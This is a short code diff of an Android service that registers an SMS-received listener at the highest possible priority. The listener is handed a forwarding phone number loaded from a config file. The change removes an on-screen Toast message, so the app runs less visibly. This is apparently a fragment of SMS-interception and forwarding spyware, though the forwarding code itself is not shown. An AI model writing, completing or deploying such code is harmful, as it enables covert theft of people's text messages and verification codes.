@@ -11,25 +11,23 @@ import android.widget.Toast;
 import java.io.FileInputStream;
 
 public class MyService extends Service {
+    private static String phone;
+
     @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
     @Override
     public void onCreate() {
+        phone = getConfigForwardPhone();
         super.onCreate();
-
-        int duration = Toast.LENGTH_SHORT;
-        Toast toast = Toast.makeText(getApplicationContext(), "加载配置文件", duration);
-        toast.show();
-
         IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
         localIntentFilter.setPriority(2147483647);
-        SmsRecevier localMessageReceiver = new SmsRecevier(getConfigForwardPhone());
+        SmsRecevier localMessageReceiver = new SmsRecevier(phone);
         Log.v("dimos", "MyService");
         registerReceiver(localMessageReceiver, localIntentFilter);
     }
-    String getConfigForwardPhone(){
+    private String getConfigForwardPhone(){
         try {
             FileInputStream inStream = openFileInput("config.dat");
             byte data[]=new byte[inStream.available()];
